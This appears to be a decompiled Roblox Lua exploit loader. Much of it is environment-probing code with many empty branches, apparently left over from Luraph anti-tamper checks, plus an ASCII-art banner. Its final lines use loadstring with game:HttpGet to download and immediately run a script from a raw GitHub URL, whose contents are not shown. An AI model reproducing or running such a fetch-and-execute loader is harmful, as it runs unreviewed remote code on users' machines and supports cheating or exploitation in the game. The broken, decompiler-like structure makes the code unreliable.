local Pcall_Result, Pcall_Result_2, Pcall_Result_3, Pcall_Result_4, Pcall_Result_5, Pcall_Result_6, Pcall_Result_7, Pcall_Result_8;
local success, r99, r100, r101 = pcall(function(a_7, b_7, c_7)
    for for_key_0, for_val_0 in next, getfenv() do
        if (type(for_key_0) ~= "string") then 
        end;
        if #for_key_0 < 20 then 
        end;
        string.byte(for_key_0, 1, -1);
    end;
    r6, Pcall_Result = pcall(assert, false);
    if r6 then 
    end;
    if Pcall_Result then 

    end;
    if (type(Pcall_Result) ~= "string") then
    else 
        r12, Pcall_Result_2 = pcall(getfenv, 0);
    end;
    if r12 then 
        if Pcall_Result_2 then 

        end;
    end;
    if (type(Pcall_Result_2) ~= "table") then 
    end;
    local _ = ({})[Pcall_Result_2];
    local r25, r26 = pcall(setfenv, 0, {});
    r28, Pcall_Result_3 = pcall(getfenv, 1);
    if r28 then 
        if Pcall_Result_3 then 

        end;
    end;
    if (type(Pcall_Result_3) ~= "table") then 
    end;
    local r38, r39 = pcall(r26, 1, {});
    r41, Pcall_Result_4 = pcall(getfenv, 2);
    if r41 then 
        if Pcall_Result_4 then 

        end;
    end;
    if (type(Pcall_Result_4) ~= "table") then 
    end;
    local r51, r52 = pcall(r39, 2, {});
    r54, Pcall_Result_5 = pcall(getfenv, 3);
    if r54 then 
        if Pcall_Result_5 then 

        end;
    end;
    if (type(Pcall_Result_5) ~= "table") then 
    end;
    local r64, r65 = pcall(r52, 3, {});
    r67, Pcall_Result_6 = pcall(getfenv, 4);
    if r67 then 
        if Pcall_Result_6 then 

        end;
    end;
    if (type(Pcall_Result_6) ~= "table") then 
    end;
    r77, Pcall_Result_7 = pcall(r65, 4, {});
    pcall(Pcall_Result_7, 0, Pcall_Result_2);
    pcall(Pcall_Result_7, 1, Pcall_Result_3);
    pcall(Pcall_Result_7, 2, Pcall_Result_4);
    pcall(Pcall_Result_7, 3, Pcall_Result_5);
    pcall(Pcall_Result_7, 4, Pcall_Result_6);
    r91, Pcall_Result_8 = pcall(loadstring, [=[
        --[[

                         .@%(/*,.......      ...,,*/(#%&@@.
                     (*   ,/(#%%&&@@@@&%((////(((##%###((/**,,.     ,//(&.
                   /* .%@@@@@@@@%,  .(&@@@&&&&&&@@@@@@&#(*,........*%@@@(.  ,#.
                 */ .&@@@@@@@*  (%,   *(&&@@@@@&%(*,.             .,*(#%(*@@&*  *,
                #, /@@@@@@* *&( ,&&/.,/#%&&@@@&(&@@@@@@@@@@@@#*,.....,/&@@@@@@@@( .%
               #  #@@@@@*/@% .#%./(,.,/*,//*,.,/(*@@@@@@@@@@@@%@@@@@@@@@#.#@@@@@@&. %
              /  &@@@@@@@@(%@# *&&*&@@@@#/&@@@@/%%.,%@@@@@@@%/@@&(,  ,,,...  *%@@@# *
            #  .&@@@@@@@@@@@,((%@@@@@#.    ,&@@#@@&* .&@@@@@&,.#@@@@/&@@%(@@@&(/,(&, /,
         (/   (@&&&%&@@@&/, ,@#(@@@@,        #@@/,&@& /@@@@@,%#%@@@@@(     *@@@@@&,%%. .
        /  #/,#@@@&#(//#@@@/ %@@@&@@@(.    ,&@@(.*/*  %@@*   %@@@@@@%       (@@&(*...%&.
         ///@@&,  (&@@#,   /@/ ,*&@@@@#&@@%#%((%@&* /@@@@@@&. #@@@#&@@@&%%@@@@@@&,/(*@/#
        %%.&@# .&@@@# /@@@@%&@@@&/.   ,/((/*,  ./&@@@@@@@@@@,*&(./%@@#*&@@@(#(....,&#*@/
        @%.&& .&@@@&*    /&@@@@@@@@@@@@@@@@&@@#/(%@@@@@@@@@@&,  (@@@@@@@@@@@@/,@@@@@#.&*
        &&,%% .&*    /@@@(.  ,(@@@@@&/(////#( /&@@@@@@@@@@@@@@@(  ,&@@@@@@@@&, (@@&*/@(/
        .%*#@( /@@@@( *@@@@@@/     *%@@@@@@@&.,@& ,#, .&@@@@@@# .#*%&/,#@@@@*   *@@&/*&*
         .&/.#@@@@@@@,   *&@@%.,&@@&(,    ,(%@%&@@@@@@@@@(.*,  /@@@@@@@@@&,      %@@@@..
        @* .%@@@@@@@@(       .   (@@@@@@@@(       .*(%&@@@@@@@@@@@@&(,  ./.*@%   /@@% ./
          @* .&@@@@@@&.             ./&@@@*.&@@@@@@@&, ,**,.    .,*(&(.%@@# %@*  ,@@% ,#
            &, /@@@@@@*                    .#@@@@@@@@*.%@@@@@(,@@@@@@& ,%(.      .&@% ,#
              / *@@@@@#                                                           %@&.,#
              (( .&@@@@*                                                          #@&.,#
               .&. ,&@@@,                                                         (@&.,#
                  #. .%@@* /@@/                                                   /@&.,(
                    ./  #@%. %@&,,#,                                              /@@,./
                      *(  #@%. . (@@@@@%/,                                        /@@,.*
                        //  %@&, *@@@@@@@@( (@%/.                                 #@@, (
                          #* .&@@#. (@@@@&.*@@@@@@@@%. */.                  *..%*.&@@, /
                            @* .%@@@%, ,/ .@@@@@@@@@@,.%@@@@@% .&@@@* #@&..&@*,* %@@&. *
                               /  *&@@@@%,   *(&@@@@&. #@@@@@* #@@@% (@@* ,.   /@@@@* (
                                 @#. .#@@@@@@&(,.                      .,*(%&@@@@@&..(
                                     &(.   ./%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(. ((
                                          ,#/*.       ..,,,,,,,,....          ,/#

        ]]--

         return setfenv(function(...) return pPwzsTvA(...) end, setmetatable({ ["pPwzsTvA"] = ... }, { __index = getfenv((...)) })) ]=], "Luraph");
    if r91 then 
        if Pcall_Result_8 then 

        end;
    end;
    if (type(Pcall_Result_8) ~= "function") then 
    end;
    return false, 54, 54;
end);
local _ = not success;
if r99 then 
end;
local _ = not r100;
if not pcall(function(a_8, b_8, c_8)
    loadstring"loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ohio99z/Flameso/refs/heads/main/Mutationsuldate.txt\", true))()"();
end) then
else 
end;
